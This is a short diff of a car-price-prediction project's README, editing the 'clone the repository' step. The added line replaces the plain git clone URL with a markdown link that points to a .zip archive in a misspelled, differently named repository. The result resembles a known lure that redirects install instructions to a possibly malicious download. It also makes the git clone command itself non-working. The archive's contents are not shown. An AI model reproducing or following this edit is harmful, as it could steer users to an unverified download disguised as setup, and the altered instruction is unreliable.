@@ -37,7 +37,7 @@ car-price-prediction/
 Getting Started
 1. Clone the repository
 Replace YOUR-USERNAME with your GitHub username:
-git clone https://github.com/Sushantknp/car-price-prediction.git
+git clone [https://github.com/Sushantknp/car-price-prediction.git](https://github.com/Sushantknp/Car-price-prdiction/blob/main/car-price-prediction.zip)
 cd car-price-prediction
 2. Create and activate a virtual environment (recommended)
 Windows
